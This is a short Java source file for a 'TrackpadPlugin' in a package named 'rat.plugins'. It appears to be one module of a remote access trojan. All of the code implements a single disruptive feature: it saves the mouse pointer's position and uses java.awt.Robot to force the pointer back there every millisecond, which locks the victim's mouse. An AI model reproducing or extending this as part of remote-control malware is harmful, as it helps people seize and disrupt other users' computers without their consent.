package rat.plugins.trackpad;

import rat.plugins.AbstractPlugin;

import java.awt.*;

public class TrackpadPlugin extends AbstractPlugin
{
    private Robot robot;
    private int x, y;

    public TrackpadPlugin()
    {
    }

    @Override
    public byte getByte()
    {
        return 3;
    }

    @Override
    public void initialize()
    {
        try
        {
            this.robot = new Robot();

            x = MouseInfo.getPointerInfo().getLocation().x;
            y = MouseInfo.getPointerInfo().getLocation().y;
        }
        catch (AWTException e)
        {
            e.printStackTrace();
        }
    }

    @Override
    public void onTick()
    {
        try
        {
            robot.mouseMove(x, y);
            Thread.sleep(1);
        }
        catch (InterruptedException e)
        {
            e.printStackTrace();
        }
    }
}
